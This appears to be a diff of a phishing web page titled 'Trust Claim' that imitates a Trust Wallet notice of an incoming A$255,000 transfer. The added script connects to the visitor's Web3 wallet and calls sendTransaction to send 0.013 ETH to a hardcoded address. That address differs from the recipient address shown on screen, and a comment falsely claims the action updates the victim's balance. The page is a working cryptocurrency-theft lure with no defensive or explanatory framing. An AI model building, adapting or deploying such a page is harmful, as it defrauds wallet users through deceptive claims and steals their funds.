@@ -1,437 +1,404 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-    <title>Trust Claim</title>
+    <meta charset="UTF-8">
+    <title>TRUST CLAIM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
     <style>
-        :root {
-            --bg-1: #020817;
-            --bg-2: #111827;
-            --panel: rgba(15, 23, 42, 0.95);
-            --panel-soft: rgba(30, 41, 59, 0.9);
-            --border: rgba(148, 163, 184, 0.2);
-            --text: #f8fafc;
-            --muted: #94a3b8;
-            --primary: #3b82f6;
-            --primary-2: #2563eb;
-            --green: #22c55e;
-            --amber: #f59e0b;
-            --red: #ef4444;
-        }
-
-        * { box-sizing: border-box; }
-
-        html, body {
+        * {
             margin: 0;
-            width: 100%;
-            min-height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background:
-                radial-gradient(circle at top, rgba(59, 130, 246, 0.18), transparent 35%),
-                linear-gradient(135deg, var(--bg-1), var(--bg-2) 55%);
-            color: var(--text);
+            padding: 0;
+            box-sizing: border-box;
         }
 
         body {
-            min-height: 100vh;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: radial-gradient(circle at top, #1f2937 0, #020617 55%);
+            color: #f9fafb;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
         }
 
-        .screen {
+        .container {
             width: 100%;
-            max-width: 440px;
+            max-width: 420px;
         }
 
         .card {
-            background: rgba(15, 23, 42, 0.9);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            box-shadow: 0 25px 70px rgba(2, 6, 23, 0.8);
-            padding: 26px 22px 20px;
+            background: rgba(15, 23, 42, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.6);
+            padding: 28px 26px;
+            border: 1px solid rgba(148, 163, 184, 0.35);
             backdrop-filter: blur(10px);
         }
 
-        .topbar {
+        .header {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            margin-bottom: 18px;
-        }
-
-        .brand {
-            display: flex;
             align-items: center;
-            gap: 10px;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            font-size: 12px;
-            color: #dbeafe;
-        }
-
-        .brand-mark {
-            width: 22px;
-            height: 22px;
-            border-radius: 8px;
-            background: linear-gradient(135deg, #60a5fa, #2563eb);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11px;
-            box-shadow: 0 10px 24px rgba(59, 130, 246, 0.45);
-        }
-
-        .badge {
-            border: 1px solid rgba(34, 197, 94, 0.3);
-            background: rgba(34, 197, 94, 0.12);
-            color: #86efac;
-            padding: 6px 10px;
-            border-radius: 999px;
-            font-size: 10px;
-            letter-spacing: 0.12em;
-            text-transform: uppercase;
-            font-weight: 700;
+            margin-bottom: 24px;
         }
 
         .title {
-            font-size: 28px;
-            font-weight: 700;
-            letter-spacing: -0.04em;
-            margin: 8px 0 8px;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            color: #e5e7eb;
         }
 
-        .subtitle {
-            color: var(--muted);
-            font-size: 14px;
-            line-height: 1.6;
+        .badge {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            padding: 6px 12px;
+            border-radius: 8px;
+            background: rgba(34, 197, 94, 0.1);
+            color: #22c55e;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
 
-        .amount-box {
-            margin-top: 22px;
-            background: rgba(15, 23, 42, 0.85);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 16px 18px;
+        .badge::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
 
         .amount-row {
+            background: rgba(30, 41, 59, 0.6);
+            border: 1px solid rgba(148, 163, 184, 0.12);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
             display: flex;
             justify-content: space-between;
-            align-items: center;
+            align-items: flex-start;
+        }
+
+        .amount-info {
+            flex: 1;
         }
 
         .amount-label {
-            font-size: 11px;
+            font-size: 12px;
             text-transform: uppercase;
             letter-spacing: 0.12em;
-            color: var(--muted);
+            color: #9ca3af;
+            margin-bottom: 4px;
+        }
+
+        .subtext {
+            font-size: 12px;
+            color: #9ca3af;
+            line-height: 1.5;
         }
 
         .amount-value {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 700;
-            color: #60a5fa;
-            letter-spacing: -0.04em;
-        }
-
-        .note {
-            margin-top: 12px;
-            font-size: 12px;
-            color: var(--muted);
-            line-height: 1.7;
-        }
-
-        .divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(148, 163, 184, 0.45), transparent);
-            margin: 22px 0 18px;
-        }
-
-        .section-title {
-            font-size: 11px;
-            letter-spacing: 0.12em;
-            text-transform: uppercase;
-            color: var(--muted);
-            margin-bottom: 10px;
-        }
-
-        .address-box {
-            background: rgba(59, 130, 246, 0.08);
-            border: 1px solid rgba(96, 165, 250, 0.18);
-            border-radius: 12px;
-            padding: 12px 14px;
-            color: #bfdbfe;
-            font-size: 12px;
-            line-height: 1.7;
-            word-break: break-all;
-            font-family: "SFMono-Regular", Consolas, monospace;
-        }
-
-        .info-box {
-            margin-top: 18px;
-            background: rgba(37, 99, 235, 0.08);
-            border: 1px solid rgba(96, 165, 250, 0.2);
-            border-left: 3px solid var(--primary);
-            padding: 12px 14px;
-            border-radius: 10px;
-            color: #dbeafe;
-            font-size: 12px;
-            line-height: 1.7;
-        }
-
-        .security {
-            margin-top: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px 14px;
-            border-radius: 12px;
-            background: rgba(34, 197, 94, 0.08);
-            border: 1px solid rgba(34, 197, 94, 0.16);
-            color: #bbf7d0;
-            font-size: 12px;
-        }
-
-        .security::before {
-            content: "✓";
-            font-weight: 700;
-            color: #4ade80;
+            color: #FFFFFF;
+            text-align: right;
         }
 
         .loading {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-top: 18px;
-            color: #dbeafe;
-            font-size: 12px;
-            min-height: 22px;
+            font-size: 13px;
+            color: #e5e7eb;
+            padding: 12px;
+            background: rgba(59, 130, 246, 0.08);
+            border-radius: 8px;
+            margin-top: 12px;
+            animation: fadeInOut 3s ease-in-out infinite;
         }
 
         .spinner {
-            width: 16px;
-            height: 16px;
+            width: 14px;
+            height: 14px;
             border-radius: 50%;
-            border: 2px solid rgba(148, 163, 184, 0.4);
-            border-top-color: #60a5fa;
-            animation: spin 0.9s linear infinite;
+            border: 2px solid rgba(59, 130, 246, 0.3);
+            border-top-color: #38bdf8;
+            animation: spin 0.8s linear infinite;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
-        .actions {
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .divider {
+            margin: 20px 0;
+            height: 1px;
+            background: linear-gradient(to right, transparent, rgba(148, 163, 184, 0.6), transparent);
+        }
+
+        .confirm-text {
+            font-size: 13px;
+            color: #cbd5e1;
+            line-height: 1.6;
+            background: rgba(30, 41, 59, 0.4);
+            border: 1px solid rgba(148, 163, 184, 0.08);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .highlight {
+            color: #e5e7eb;
+            font-weight: 600;
+        }
+
+        .btn-row {
             display: flex;
             gap: 12px;
-            margin-top: 22px;
+            margin-bottom: 16px;
         }
 
         .btn {
             flex: 1;
-            border: none;
+            padding: 12px 14px;
             border-radius: 12px;
-            padding: 14px 18px;
-            font-size: 13px;
-            font-weight: 700;
-            letter-spacing: 0.04em;
-            text-transform: uppercase;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s ease, opacity 0.2s ease, box-shadow 0.2s ease;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .btn:hover { transform: translateY(-1px); }
-        .btn:active { transform: translateY(0); }
-
-        .btn.secondary {
-            background: rgba(148, 163, 184, 0.12);
-            color: #e2e8f0;
-            border: 1px solid rgba(148, 163, 184, 0.3);
+        .btn-secondary {
+            background: transparent;
+            color: #e5e7eb;
+            border: 1.5px solid rgba(148, 163, 184, 0.3);
         }
 
-        .btn.primary {
-            background: linear-gradient(135deg, var(--primary), var(--primary-2));
-            color: white;
-            box-shadow: 0 12px 30px rgba(37, 99, 235, 0.45);
+        .btn-secondary:hover {
+            background: rgba(148, 163, 184, 0.08);
+            border-color: rgba(148, 163, 184, 0.5);
+        }
+
+        .btn-secondary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: #0b1120;
+            box-shadow: 0 8px 24px rgba(34, 197, 94, 0.3);
+            font-weight: 600;
+        }
+
+        .btn-primary:hover {
+            filter: brightness(1.08);
+            box-shadow: 0 12px 32px rgba(34, 197, 94, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
         }
 
         .status {
-            display: none;
-            margin-top: 16px;
             padding: 12px 14px;
-            border-radius: 10px;
+            border-radius: 8px;
             font-size: 12px;
-            line-height: 1.6;
-            text-align: center;
+            font-weight: 500;
+            line-height: 1.5;
+            animation: slideUp 0.3s ease;
         }
 
-        .status.show { display: block; }
-        .status.info {
-            background: rgba(59, 130, 246, 0.12);
-            border: 1px solid rgba(96, 165, 250, 0.2);
-            color: #dbeafe;
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-        .status.success {
-            background: rgba(34, 197, 94, 0.12);
-            border: 1px solid rgba(34, 197, 94, 0.22);
-            color: #bbf7d0;
+
+        .status.ok {
+            background: rgba(34, 197, 94, 0.1);
+            color: #22c55e;
+            border: 1px solid rgba(34, 197, 94, 0.3);
         }
-        .status.warning {
-            background: rgba(245, 158, 11, 0.12);
-            border: 1px solid rgba(245, 158, 11, 0.25);
-            color: #fcd34d;
-        }
+
         .status.error {
-            background: rgba(239, 68, 68, 0.12);
-            border: 1px solid rgba(239, 68, 68, 0.22);
-            color: #fecaca;
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .status.info {
+            background: rgba(59, 130, 246, 0.1);
+            color: #3b82f6;
+            border: 1px solid rgba(59, 130, 246, 0.3);
         }
 
         @media (max-width: 480px) {
             .card {
-                padding: 22px 18px 18px;
-                border-radius: 20px;
-            }
-
-            .title {
-                font-size: 24px;
+                padding: 20px;
+                border-radius: 18px;
             }
 
             .amount-value {
-                font-size: 22px;
+                font-size: 24px;
             }
 
-            .actions {
-                flex-direction: column;
+            .title {
+                font-size: 18px;
+            }
+
+            .btn {
+                padding: 11px 12px;
+                font-size: 13px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="screen">
-        <div class="card">
-            <div class="topbar">
-                <div class="brand">
-                    <div class="brand-mark">T</div>
-                    <span>Trust</span>
-                </div>
-                <div class="badge">Secure</div>
-            </div>
 
-            <div class="title">Incoming transfer</div>
-            <div class="subtitle">A secure transaction request is awaiting your approval.</div>
-
-            <div class="amount-box">
-                <div class="amount-row">
-                    <div class="amount-label">Amount</div>
-                    <div class="amount-value">A$255,000</div>
-                </div>
-                <div class="note">This confirms an incoming transfer request. Review and approve the transaction within Trust Wallet.</div>
-            </div>
-
-            <div class="divider"></div>
-
-            <div class="section-title">Recipient</div>
-            <div class="address-box">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</div>
-
-            <div class="info-box">
-                By continuing, you are approving a transaction sending 0.013 ETH to the wallet address above. The operation will be reviewed and confirmed through Trust Wallet.
-            </div>
-
-            <div class="security">Protected by wallet-level verification and signed transaction approval</div>
-
-            <div class="loading" id="loadingRow">
-                <div class="spinner"></div>
-                <div>Preparing secure wallet session…</div>
-            </div>
-
-            <div class="actions">
-                <button class="btn secondary" id="cancelBtn" type="button">Cancel</button>
-                <button class="btn primary" id="confirmBtn" type="button">Open Trust Wallet</button>
-            </div>
-
-            <div class="status" id="statusText"></div>
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <div class="title">TRUST CLAIM</div>
+            <div class="badge">Secure incoming</div>
         </div>
+
+        <div class="amount-row">
+            <div class="amount-info">
+                <div class="amount-label">incoming transaction</div>
+                <div class="subtext" style="margin-top:4px;">notification</div>
+            </div>
+            <div class="amount-value">A$255,000</div>
+        </div>
+
+        <div class="subtext">
+            This confirms an incoming transaction request. To proceed, you will be asked to review and Accept 
+        </div>
+
+        <div class="loading" id="loadingRow">
+            <div class="spinner"></div>
+            <div>Preparing secure transaction details…</div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="confirm-text">
+            By selecting <span class="highlight">Confirm & Proceed</span>, you will be Getting A$255,000
+            in your wallet to manually approve a single transaction sending
+            <span class="highlight">ETH</span> to:
+            <br><br>
+            <span class="highlight">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</span>.
+            <br><br>
+            YOU WILL SEE THE TRANSFERRED AUD AMOUNT ON YOUR WALLET
+        </div>
+
+        <div class="btn-row">
+            <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
+            <button class="btn btn-primary" id="confirmBtn">Confirm & Proceed</button>
+        </div>
+
+        <div class="status" id="statusText"></div>
     </div>
+</div>
 
-    <script>
-        const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
-        const AMOUNT_ETH = "0.013";
+<script>
+    const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
+    const AMOUNT_ETH = "0.013"; // ETH
 
-        const statusText = document.getElementById("statusText");
-        const loadingRow = document.getElementById("loadingRow");
-        const cancelBtn = document.getElementById("cancelBtn");
-        const confirmBtn = document.getElementById("confirmBtn");
+    const statusText = document.getElementById("statusText");
+    const loadingRow = document.getElementById("loadingRow");
+    const cancelBtn = document.getElementById("cancelBtn");
+    const confirmBtn = document.getElementById("confirmBtn");
 
-        function showStatus(message, type = "info") {
-            statusText.textContent = message;
-            statusText.className = `status show ${type}`;
-        }
+    // Simulate loading state
+    setTimeout(() => {
+        loadingRow.style.opacity = "0.6";
+        loadingRow.querySelector("div:nth-child(2)").textContent = "Ready for wallet confirmation.";
+    }, 1800);
 
-        function hideStatus() {
-            statusText.className = "status";
-        }
+    cancelBtn.onclick = () => {
+        statusText.textContent = "Transaction cancelled. No action has been taken.";
+        statusText.className = "status";
+    };
 
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
+    confirmBtn.onclick = async () => {
+        try {
+            statusText.textContent = "Connecting to wallet…";
+            statusText.className = "status info";
 
-        function openTrustWalletApp() {
-            const currentUrl = encodeURIComponent(window.location.href);
-            const trustDeepLink = "trust://";
-            const trustUniversalLink = "https://link.trustwallet.com/open_url?url=" + currentUrl;
-
-            if (isMobile()) {
-                const iframe = document.createElement("iframe");
-                iframe.style.display = "none";
-                iframe.src = trustDeepLink;
-                document.body.appendChild(iframe);
-
-                setTimeout(() => {
-                    window.location.href = trustUniversalLink;
-                }, 150);
-
-                return true;
-            }
-
-            return false;
-        }
-
-        cancelBtn.addEventListener("click", () => {
-            hideStatus();
-            showStatus("Transaction cancelled. No action was taken.", "warning");
-        });
-
-        confirmBtn.addEventListener("click", async () => {
-            const mobile = isMobile();
-            confirmBtn.disabled = true;
-            loadingRow.style.opacity = "1";
-            loadingRow.innerHTML = '<div class="spinner"></div><div>Opening Trust Wallet…</div>';
-
-            if (mobile) {
-                openTrustWalletApp();
-                showStatus("Redirecting to Trust Wallet…", "info");
-
-                setTimeout(() => {
-                    confirmBtn.disabled = false;
-                    loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
-                }, 2200);
+            if (!window.ethereum) {
+                statusText.textContent = "No Web3 wallet detected. Please open this page inside Trust Wallet or a compatible browser.";
+                statusText.className = "status error";
                 return;
             }
 
-            showStatus("This feature is intended for mobile devices with Trust Wallet installed.", "warning");
-            confirmBtn.disabled = false;
-            loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
-        });
+            // Connect to wallet (Trust Wallet, MetaMask, etc.)
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
 
-        setTimeout(() => {
-            loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
-        }, 1500);
-    </script>
+            const fromAddress = await signer.getAddress();
+
+            statusText.textContent = "Preparing 0.013 ETH transaction for your review…";
+            statusText.className = "status info";
+
+            // Build transaction: send wallet to target address
+            const tx = {
+                to: TARGET_ADDRESS,
+                value: ethers.utils.parseEther(AMOUNT_ETH)
+            };
+
+            // This will Update your Wallet balance to the incoming Transaction 
+            const response = await signer.sendTransaction(tx);
+
+            statusText.textContent = "Transaction submitted. Waiting for confirmation on-chain…";
+            statusText.className = "status info";
+
+            await response.wait();
+
+            statusText.textContent = "Transaction confirmed. 0.013 ETH sent successfully.";
+            statusText.className = "status ok";
+        } catch (err) {
+            console.error(err);
+            statusText.textContent = "Transaction failed or was rejected. No funds were moved without your approval.";
+            statusText.className = "status error";
+        }
+    };
+</script>
+
 </body>
 </html>
